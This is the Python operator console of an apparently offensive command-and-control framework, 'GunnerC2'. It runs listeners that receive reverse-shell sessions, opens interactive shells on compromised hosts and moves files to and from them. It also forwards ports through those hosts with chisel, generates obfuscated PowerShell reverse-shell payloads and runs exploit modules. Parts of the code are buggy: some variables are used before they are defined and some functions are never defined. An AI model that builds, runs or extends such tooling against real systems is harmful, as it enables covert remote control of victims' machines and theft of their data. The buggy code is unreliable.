#!/usr/bin/env python3

import sys
import threading
import readline
import os
import shlex
import argparse
import subprocess
import rlcompleter
import socket
import json
import base64
import queue
import atexit

from core.module_loader import load_module
from core.module_loader import search_modules, discover_module_files
from core import shell, utils, banner, portfwd
from core.listeners import tcp_listener, https_listener, http_handler
from core.session_handlers import session_manager, sessions
from core.background_module_runner import run_in_background, list_jobs
from core.utils import portforwards, unregister_forward, list_forwards, defender
from core.gunnershell.gunnershell import Gunnershell

from core.payload_generator import *
from core.banner import print_banner

from colorama import init, Fore, Style
brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"
COLOR_RESET  = "\001\x1b[0m\002"

# store last search results and the currently selected module
search_results = []
current_module = None

PROMPT = brightblue + "GunnerC2 > " + brightblue

MODULE_DIR = os.path.join(os.path.dirname(__file__), "core/modules")  # ensure correct path

COMMANDS = sorted(utils.commands.keys())

HISTORY_FILE = os.path.expanduser("~/.gunnerc2_history")

try:
    readline.read_history_file(HISTORY_FILE)

except FileNotFoundError:
    pass

def _save_main_history():
    readline.write_history_file(HISTORY_FILE)
    atexit.register(_save_main_history)


class SilentParser(argparse.ArgumentParser):
    def error(self, message):
        # override to suppress default usage+error output
        raise SystemExit(1)


def get_all_modules():
    return discover_module_files(MODULE_DIR)

def completer(text, state):
    buf = readline.get_line_buffer().lstrip()
    tokens = buf.split()
    # first token: complete top-level commands

    if len(tokens) <= 1:
        options = [c for c in COMMANDS if c.startswith(text)]

    else:
        cmd = tokens[0]
        arg = text
        # complete module names or numbers after "use"

        if cmd == "use":
            mods = get_all_modules()
            options = [m for m in mods if m.startswith(arg)]
            options += [str(i+1) for i in range(len(mods)) if str(i+1).startswith(arg)]

        # complete module names after "search"
        elif cmd == "search":
            mods = get_all_modules()
            options = [m for m in mods if m.startswith(arg)] + ["all"]

        # complete option keys inside module
        elif cmd == "set" and current_module:
            opts = list(current_module.options.keys())
            options = [o for o in opts if o.startswith(arg)]

        else:
            options = []
    try:
        return options[state]

    except IndexError:
        return None


def bind_keys():
    readline.parse_and_bind('"\\C-l": clear-screen')

    # enable tab completion
    readline.parse_and_bind("tab: complete")
    readline.set_completer(completer)

def upload_any(sid, local_path, remote_path):
    """
    Upload either a single file or an entire folder, over HTTP or TCP, 
    depending on the session transport and the remote OS.
    """
    # resolve session & metadata
    session = session_manager.sessions.get(sid)
    if not session:
        print(brightred + f"[!] No such session: {sid}")
        return

    os_type = session.metadata.get("os", "").lower()
    is_dir = os.path.isdir(local_path)
    if not (os.path.exists(local_path)):
        print(brightred + f"[!] Local path not found: {local_path}")
        return
    
    if is_dir:
        return True

    elif not is_dir:
        return False

    else:
        print(brightred + f"[-] ERROR an error ocurred when checking the object type.")



def operator_loop():
    bind_keys()
    global search_results, current_module
    while True:
        user = input(PROMPT).strip()

        if not user:
            continue

        elif user == "\x0c":  # Control+L
            os.system("clear")
            continue

         # --- Help system ---
        elif user.startswith("help"):
            parts = shlex.split(user)

            if len(parts) == 1:
                utils.print_help()

            elif len(parts) == 2:
                utils.print_help(parts[1])

            elif len(parts) == 3:
                utils.print_help(f"{parts[1]} {parts[2]}")

            else:
                print(brightyellow + "Usage: help or help <command> [subcommand]")

            continue

        elif user.startswith("banner"):
            os.system("clear")
            print_banner()
            continue

        ### Download command parsing
        elif user.startswith("download"):
            try:
                try:
                    args = shlex.split(user)
                    parser = argparse.ArgumentParser(prog="download", add_help=False)
                    parser.add_argument("-i", required=True)
                    parser.add_argument("-f", required=True)
                    parser.add_argument("-o", required=True)
                    
                    try:
                        parsed_args = parser.parse_args(parts[1:])

                    except SystemExit:
                        print(brightyellow + "Usage: download -i <session_id> -f <remote_file> -o <local_file>")
                        continue

                except Exception as e:
                    continue

                #sid = parsed_args.i
                raw_id = parsed_args.i
                sid = session_manager.resolve_sid(raw_id)
                session = session_manager.sessions[sid]
                meta = session.metadata
                operatingsystem = meta.get("os", "").lower()

                if not sid:
                    print(brightred + f"Invalid session or alias: {raw_id}")
                    continue

                remote_file = parsed_args.f

                if "\\" not in remote_file and operatingsystem == "windows":
                    print(brightred + "Use double backslashes when specifying file paths.")
                    continue

                local_file = parsed_args.o

                """if sid not in session_manager.sessions:
                    print(f"Invalid session ID: {sid}")
                    continue"""

                if session_manager.sessions[sid].transport in ("http", "https"):
                    check = upload_any(sid, local_file, remote_file)
                    if check is True:
                        shell.download_folder_http(sid, remote_file, local_file)

                    elif check is False:
                        shell.download_file_http(sid, remote_file, local_file)

                    else:
                        pass

                elif session_manager.is_tcp_session(sid):
                    check = upload_any(sid, local_file, remote_file)
                    if check is True:
                        shell.download_folder_tcp(sid, remote_file, local_file)

                    elif check is False:
                        shell.download_file_tcp(sid, remote_file, local_file)

                    else:
                        pass

                else:
                    print(brightred + f"[-] ERROR unsupported shell type.")

            except SystemExit:
                print(brightgreen + "Run help for info: help or help <command> [subcommand]")
                #print(utils.commands["download"])

            except Exception as e:
                print(brightred + f"Error parsing arguments: {e}")
            continue


        elif user.startswith("upload"):
            try:
                parts = user.split()
                if len(parts) < 7:
                    print(brightyellow + "Usage: upload -i <session_id> -l <local_file> -r <remote_file>")

                try:
                    raw_sid = parts[parts.index("-i") + 1]
                    local_file = parts[parts.index("-l") + 1]
                    remote_file = parts[parts.index("-r") + 1]
                    try:
                        unformatted_sid = session_manager.resolve_sid(raw_sid)
                        sid = str(unformatted_sid)

                    except Exception as e:
                        print(brightred + f"Invalid session or alias: {raw_sid}")

                    session = session_manager.sessions[sid]
                    meta = session.metadata
                except Exception as e:
                    print(brightred + f"ERROR: {e}")

                if "\\" not in remote_file and meta.get("os", "").lower() == "windows":
                    print(brightred + "Use double backslashes when specifying file paths.")
                    continue

                
                if not sid:
                    print(brightred + f"Invalid session or alias: {raw_id}")
                    continue

                """if sid not in session_manager.sessions:
                    print("Invalid session ID.")
                    continue"""


                if session_manager.sessions[sid].transport in ("http", "https"):
                    if os.path.isdir(local_file):
                        shell.upload_folder_http(sid, local_file, remote_file)
                    else:
                        shell.upload_file_http(sid, local_file, remote_file)

                elif session_manager.is_tcp_session(sid):
                    if os.path.isdir(local_file):
                        shell.upload_folder_tcp(sid, local_file, remote_file)
                    else:
                        shell.upload_file_tcp(sid, local_file, remote_file)
                else:
                    print(brightred + "Unknown session type.")

            except:
                continue
                #print("Usage: upload -i <session_id> -l <local_file> -r <remote_file>")

        elif user.startswith("gunnershell"):
            parts = shlex.split(user)
            if len(parts) != 2:
                print(brightyellow + "Usage: gunnershell <session_id_or_alias>")
                continue

            sid = session_manager.resolve_sid(parts[1])
            display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
            if not sid or sid not in session_manager.sessions:
                print(brightred + f"No such session or alias: {parts[1]}")
                continue

            try:
                print(brightgreen + f"[*] Starting GunnerShell on {display}...")
                gs = Gunnershell(sid)
                new = gs.interact()
                if new:
                    # we switched — go back to main prompt, then immediately
                    # re-enter a fresh subshell on the new session
                    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == new), new)
                    print(brightgreen + f"[*] Now launching GunnerShell on {display}…")
                    gs = Gunnershell(new)
                    gs.interact()

                else:
                    pass
            except ValueError as e:
                print(brightred + str(e))
            continue

        elif user.startswith("shelldefence"):
            parts = user.split()
            try:
                if len(parts) != 2 or parts[1] not in ("on", "off"):
                    print(brightyellow + "Usage: shelldefence <on|off>")

                if parts[1] == "on":
                    defender.is_active = True

                elif parts[1] == "off":
                    defender.is_active = False

            except IndexError:
                pass

            except Exception as e:
                print(brightred + f"[!] An unknown error has ocurred: {e}")

        elif user.strip() == "start":
            # print the help/description for the "start" command
            utils.print_help("start")
            continue


        elif user.startswith("start https"):
            try:
                parts = shlex.split(user)
                parser = SilentParser(prog="start https", add_help=False)
                parser.add_argument("start")
                parser.add_argument("https")
                parser.add_argument("ip")
                parser.add_argument("port", type=int)
                parser.add_argument("-c", dest="certfile", help="Path to TLS cert", required=False)
                parser.add_argument("-k", dest="keyfile", help="Path to TLS key", required=False)
            
                try:
                    parsed = parser.parse_args(parts)
                except SystemExit:
                    print("test")
                    print(brightyellow + "Usage: start https <ip> <port> [-c <certfile> -k <keyfile>]")
                    continue

                threading.Thread(
                    target=https_listener.start_https_listener,
                    args=(parsed.ip, parsed.port, parsed.certfile, parsed.keyfile),
                    daemon=True
                ).start()

            except Exception:
                print(brightyellow + "Usage: start https <ip> <port> [-c <certfile> -k <keyfile>]")
                pass

                

        elif user.startswith("start http"):
            try:
                _, _, ip, port = user.split()
                port = int(port)
                threading.Thread(target=http_handler.start_http_listener, args=(ip, port), daemon=True).start()
            except:
                print(brightyellow + "Usage: start http <ip> <port>")

        elif user.startswith("start tcp"):
            try:
                parts = shlex.split(user)
                parser = SilentParser(prog="start tcp", add_help=False)
                parser.add_argument("start")
                parser.add_argument("tcp")
                parser.add_argument("ip")
                parser.add_argument("--ssl", dest="ssl", action="store_true", help="Run listener with TLS/SSL", required=False)
                parser.add_argument("port", type=int)
                parser.add_argument("-c", dest="certfile", help="TLS certificate file", required=False)
                parser.add_argument("-k", dest="keyfile", help="TLS key file", required=False)

                try:
                    parsed = parser.parse_args(parts)

                except SystemExit:
                    pass
                    #print(brightyellow + "Usage: start tcp <ip> <port> [-c <certfile> -k <keyfile>]")

                ip = parsed.ip
                port = parsed.port
                certfile = parsed.certfile
                keyfile = parsed.keyfile
                is_ssl = parsed.ssl

                try:
                    if is_ssl:
                        is_ssl = True

                    else:
                        is_ssl = False

                except Exception as e:
                    print(brightred + f"[-] ERROR failed to access argument variables: {e}")

                try:
                    if certfile and keyfile and not is_ssl:
                        try:
                            while True:
                                decide = input(brightyellow + f"[*] You inputted a cert and key file without the --ssl flag, would you like to use SSL/TLS? Y/n? ")

                                if decide.lower() == "y" or decide.lower() == "yes":
                                    is_ssl = True
                                    break

                                elif decide.lower() == "n" or decide.lower() == "no":
                                    is_ssl = False
                                    break

                                else:
                                    print(brightred + f"[-] ERROR please select a valid option!\n")

                        except Exception as e:
                            print(brightred + f"\n[-] ERROR failed to get answer from user in loop: {e}")

                except Exception as e:
                    print(brightred + f"\n[-] ERROR failed to parse arguments: {e}")

                threading.Thread(
                    target=tcp_listener.start_tcp_listener,
                    args=(ip, port, certfile, keyfile, is_ssl),
                    daemon=True
                ).start()

            except Exception:
                print(brightyellow + "Usage: start tcp <ip> <port> [-c <certfile> -k <keyfile>]")
                pass

        elif user == "listeners":
            utils.list_listeners()

        elif user == "sessions":
            utils.list_sessions()

        elif user.startswith("shell"):
            try:
                _, sid = user.split()
                real_sid = session_manager.resolve_sid(sid)
                if real_sid:
                    if session_manager.sessions[real_sid].transport in ("http", "https"):
                        shell.interactive_http_shell(real_sid)
                    elif session_manager.is_tcp_session(real_sid):
                        shell.interactive_tcp_shell(real_sid)
                    else:
                        print(brightred + "Unknown session type.")
                else:
                    print(brightred + "Invalid session ID.")
            except Exception as e:
                print(e)
                print(brightyellow + "Usage: shell <session_id>")

        elif user.startswith("alias"):
            parts = shlex.split(user)
            if len(parts) != 3:
                print(brightyellow + "Usage: alias <OLD_SID_or_ALIAS> <NEW_ALIAS>")
                continue

            old, new = parts[1], parts[2]
            real = session_manager.resolve_sid(old)
            if not real:
                print(brightred + f"No such session or alias: {old}")
                continue

            session_manager.set_alias(new, real)
            print(brightgreen + f"Alias set: {new!r} → {real}")

            old_display = old
            for entry in portforwards.values():
                if entry["sid"] == old_display:
                    entry["sid"] = new

            continue

        elif user.startswith("generate"):
            # Split input
            try:
                parts = shlex.split(user)

            except Exception as e:
                print(brightred + f"[!] We hit an error while parsing your command: {e}")

            if "-p" not in parts:
                print(brightyellow + "You must specify payload type first with -p")
                continue

            # Extract payload type early
            try:
                payload_index = parts.index("-p") + 1
                payload_type = parts[payload_index]

            except IndexError:
                print(brightred + f"[!] You must specify a value for -p")
                continue

            #### Profile-based parsing starts here ####

            if payload_type == "tcp-win":
                    parser = SilentParser(prog="generate (tcp-win)", add_help=False)
                    parser.add_argument("-f", "--format", choices=["ps1"], required=True)
                    parser.add_argument("-obs", "--obfuscation", type=int, choices=[1, 2, 3], required=False)
                    parser.add_argument("--ssl", dest="ssl", action="store_true", help="Use SSL/TLS for the TCP reverse shell payload", required=False)
                    parser.add_argument("-p", "--payload", choices=["tcp-win"], required=True)
                    parser.add_argument("-o", "--output", required=False)
                    parser.add_argument("-lh", "--local_host", required=True)
                    parser.add_argument("-lp", "--local_port", required=True)

            elif payload_type == "http-win":
                parser = SilentParser(prog="generate (http-win)", add_help=False)
                parser.add_argument("-f", "--format", choices=["ps1"], required=True)
                parser.add_argument("-obs", "--obfuscation", type=int, choices=[1, 2, 3], required=False)
                parser.add_argument("-p", "--payload", choices=["http-win"], required=True)
                parser.add_argument("-o", "--output", required=False)
                parser.add_argument("-lh", "--local_host", required=True)
                parser.add_argument("-lp", "--local_port", required=True)
                parser.add_argument("--beacon_interval", required=True)

            elif payload_type == "https-win":
                parser = SilentParser(prog="generate (https-win)", add_help=False)
                parser.add_argument("-f", "--format", choices=["ps1"], required=True)
                parser.add_argument("-obs", "--obfuscation", type=int, choices=[1,2,3], required=False)
                parser.add_argument("-p", "--payload", choices=["https-win"], required=True)
                parser.add_argument("-o", "--output", required=False)
                parser.add_argument("-lh", "--local_host", required=True)
                parser.add_argument("-lp", "--local_port", required=True)
                parser.add_argument("--beacon_interval", required=True)

            else:
                print(brightred + f"Unknown payload type: {payload_type}")
                continue

            # Parse remaining args
            try:
                args = parser.parse_args(parts[1:])
            except SystemExit:
                print(brightyellow + utils.commands["generate"])
                continue

            if payload_type == "tcp-win":
                if args.ssl:
                    args.ssl = True


            # Call generators
            if args.payload == "tcp-win":
                raw = generate_windows_powershell_tcp(args.local_host, args.local_port, args.obfuscation, args.ssl)

            elif args.payload == "http-win":
                raw = generate_windows_powershell_http(args.local_host, args.local_port, args.beacon_interval, args.obfuscation)

            elif args.payload == "https-win":
                raw = generate_windows_powershell_https(args.local_host, args.local_port, args.beacon_interval, args.obfuscation)

                if args.output:
                    with open(args.output, "w") as f:
                        f.write(raw)

                    print(brightgreen + f"[+] Payload written to {args.output}")
                    continue

        elif user.startswith("search"):
            parts = user.split()
            if len(parts) < 2:
                utils.print_help(parts[0])

            elif parts[1] in ("all", "ALL"):
                modules = search_modules(parts[1])

                if modules:
                    search_results = modules
                    for idx, m in enumerate(search_results, 1):
                        print(brightyellow + f"[{idx}] " + brightgreen + m)

                else:
                    print(brightred + f"[-] ERROR failed to find module matching the keyword {keyword}")

            elif len(parts) > 2:
                print(brightred + f"[-] ERROR too many arguments for search command.")
                utils.print_help(parts[0])

            elif len(parts) == 2 and parts[1] not in ("ALL", "all"):
                keyword = parts[1]
                modules = search_modules(keyword)

                if modules is None:
                    print(brightred + f"[-] ERROR failed to find module matching the keyword {keyword}")

                else:
                    # store and display numbered modules
                    search_results = modules
                    for idx, m in enumerate(search_results, 1):
                        print(brightyellow + f"[{idx}] " + brightgreen + m)

            else:
                try:
                    utils.print_help(parts[0])

                except Exception as e:
                    print(brightred + f"[-] ERROR an unknown error as ocurred: {e}")

        elif user.startswith("use"):
            parts = user.split()
            if len(parts) != 2:
                print(brightyellow + "Usage: use <module_name>")
                continue

            modname = parts[1]

            # if numeric, pick from last search results
            if modname.isdigit():
                idx = int(modname) - 1
                if idx < 0 or idx >= len(search_results):
                    print(brightred + f"Invalid module number: {modname}")
                    continue
                modname = search_results[idx]
            else:
                modname = modname

            current_module = load_module(modname)
    
            if not current_module:
                continue

            while True:
                subcmd = input(brightblue + f"module({current_module.name}) > ").strip()

                if not subcmd:
                    continue
        
                if subcmd in ("back", "exit", "quit", "leave"):
                    break

                elif subcmd == "show options":
                    current_module.show_options()

                elif subcmd == "info":
                    print(brightyellow + f"\nModule: {current_module.name}\n")
                    print(brightgreen + f"Description: {current_module.description}\n")
                    current_module.show_options()

                elif subcmd.startswith("set "):
                    _, key, val = subcmd.split(" ", 2)

                    try:
                        current_module.set_option(key, val)

                    except KeyError as e:
                        print(e)


                elif subcmd.lower().split()[0] in ("run", "exploit", "pwn"):
                    parts = shlex.split(subcmd)
                    # detect and strip trailing '&'
                    wants_bg = False
                    if parts[-1] == "&":
                        wants_bg = True
                        parts = parts[:-1]
                    else:
                        ans = input(brightyellow + "[*] Run in background? [y/N]: ").strip().lower()
                        if ans in ("y", "yes"):
                            wants_bg = True

                    # validate before launching
                    missing = current_module.validate()
                    if missing is not True:
                        print(brightred + f"[!] Missing required options: {', '.join(missing)}")
                        continue

                    if wants_bg:
                        run_in_background(current_module)

                    else:
                        try:
                            current_module.run()
                        except Exception as e:
                            print(brightred + f"[-] ERROR running module: {e}")

                elif subcmd in ("help", "?"):
                    print(brightyellow + "\nModule Help Menu:\n")
                    print(brightgreen + f"""
show options         - View all configurable options for this module
set <option> <val>   - Set a value for a required or optional field
run                  - Execute the module logic using configured options
info                 - Display module metadata including description and options
back                 - Exit module and return to main C2 prompt
help                 - Display this help menu
""")


                elif subcmd.split()[0] == "jobs":
                    parts = shlex.split(subcmd)
                    parser = argparse.ArgumentParser(prog="jobs", add_help=False)
                    parser.add_argument("--print", action="store_true", dest="want_output")
                    parser.add_argument("-i", type=int, dest="job_id")

                    try:
                        args = parser.parse_args(parts[1:])

                    except SystemExit:
                        print(brightyellow + "Usage: jobs [--print] [-i <job_id>]")
                        continue

                    if args.want_output:
                        if args.job_id is None:
                            print(brightyellow + "Usage: jobs --print -i <job_id>")
                        else:
                            out = get_job_output(args.job_id)
                            if out is None:
                                print(brightred + f"No such job: {args.job_id}")
                            else:
                                print(brightblue + f"\n=== Output for job {args.job_id} ===\n")
                                print(out)
                    else:
                        list_jobs()

                    continue

                else:
                    print(brightred + f"Unknown command: {subcmd}")
                    print(brightyellow + "Type 'help' to see available commands.")


        elif user.startswith("kill"):
            parts = shlex.split(user)
            if len(parts) == 3 and parts[1] == "-i":
                raw = parts[2]
                sid = session_manager.resolve_sid(raw)
                display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), raw)

                if not sid or sid not in session_manager.sessions:
                    print(brightred + f"[!] Invalid session or alias: {raw}")
                else:
                    if session_manager.sessions[sid].transport in ("http", "https"):
                        if session_manager.kill_http_session(sid):
                            print(brightyellow + f"[*] Killed HTTP session {display}")
                        else:
                            print(brightred + f"[!] No such HTTP session {display}")

                    elif session_manager.is_tcp_session(sid):
                        # close socket and remove from sessions
                        session_manager.sessions[sid].handler.close()
                        del session_manager.sessions[sid]
                        print(brightyellow + f"[*] Closed TCP session {display}")

                    else:
                        print(brightred + f"[!] Unknown session type for {display}")
            else:
                print(brightyellow + "Usage: kill -i <session_id>")
            continue

        elif user.startswith("jobs"):
            try:
                parts = shlex.split(user)
                parser = argparse.ArgumentParser(prog="jobs", add_help=False)
                parser.add_argument("--print", action="store_true", dest="want_output")
                parser.add_argument("-i", type=int, dest="job_id")

                try:
                    args = parser.parse_args(parts[1:])

                except SystemExit:
                    print(brightyellow + "Usage: jobs [--print] [-i <job_id>]")
                    continue

                if args.want_output:
                    if args.job_id is None:
                        print(brightyellow + "Usage: jobs --print -i <job_id>")
                    else:
                        out = get_job_output(args.job_id)
                        if out is None:
                            print(brightred + f"No such job: {args.job_id}")
                        else:
                            print(brightblue + f"\n=== Output for job {args.job_id} ===\n")
                            print(out)
                else:
                    list_jobs()

                continue

            except Exception as e:
                print(brightred + f"[-] ERROR failed to list jobs: {e}")
            continue

        elif user.startswith("portfwd"):
            parts = shlex.split(user)

            if len(parts) > 1:
                subcmd = parts[1]

                if subcmd == "add":
                # parse flags: -i, -lh, -lp, -rh, -rp
                    try:
                        opts = dict(zip(parts[2::2], parts[3::2]))
                        sid = opts['-i']
                        try:
                            local_host = opts.get('-lh', '127.0.0.1')

                        except Exception as e:
                            local_host = "127.0.0.1"

                        local_port = int(opts['-lp'])
                        remote_host = opts['-rh']
                        remote_port = int(opts['-rp'])
                        chisel_port = int(opts['-cp'])

                    except Exception:
                        print(brightyellow + "Usage: portfwd add -i <sid> -lh <local_host> -lp <local_port> -rh <remote_host> -rp <remote_port> -cp <chisel_port>")
                        continue

                    sid = session_manager.resolve_sid(sid)
                    
                    if not sid:
                        print(brightred + "Invalid session.")
                        continue

                    rid = str(len(portforwards) + 1)
                    t = threading.Thread(
                    target=portfwd.portfwd_listener,
                    args=(rid, sid, local_host, local_port, remote_host, remote_port, chisel_port),
                    daemon=True
                    )
                    t.start()
                    print(brightgreen + f"[+] Forward #{rid} {local_host}:{local_port} → {sid} → {remote_host}:{remote_port}")

                elif subcmd == "list":
                    for rid, m in list_forwards().items():
                        print(brightgreen + f"{rid}: {m['local_host']}:{m['local']} → {m['sid']} → {m['remote']}")

                elif subcmd == "delete":
                    try:
                        idx = parts.index('-i')
                        rid = parts[idx+1]

                    except Exception:
                        print(brightyellow + "Usage: portfwd delete -i <rule_id>")
                        continue

                    if rid in portforwards:
                        unregister_forward(rid)
                        print(brightyellow + f"[+] Removed forward {rid}")
                    else:
                        print(brightred + "Unknown forward ID.")

                else:
                    print(brightyellow + "Usage:")
                    print(brightyellow + "  portfwd add    -i <sid> -lh <local_host> -lp <local_port> -rh <remote_host> -rp <remote_port>")
                    print(brightyellow + "  portfwd list")
                    print(brightyellow + "  portfwd delete -i <rule_id>")

            else:
                    print(brightyellow + "Usage:")
                    print(brightyellow + "  portfwd add    -i <sid> -lh <local_host> -lp <local_port> -rh <remote_host> -rp <remote_port>")
                    print(brightyellow + "  portfwd list")
                    print(brightyellow + "  portfwd delete -i <rule_id>")

            


        elif user in ("exit", "quit"):
            utils.shutdown()
            print(brightyellow + "Exiting.")
            exit(0)

        else:
            #print("TEST")
            print(brightred + "Unknown command.")

if __name__ == "__main__":
    # NO MORE PRINTER THREAD
    print_banner()
    operator_loop()
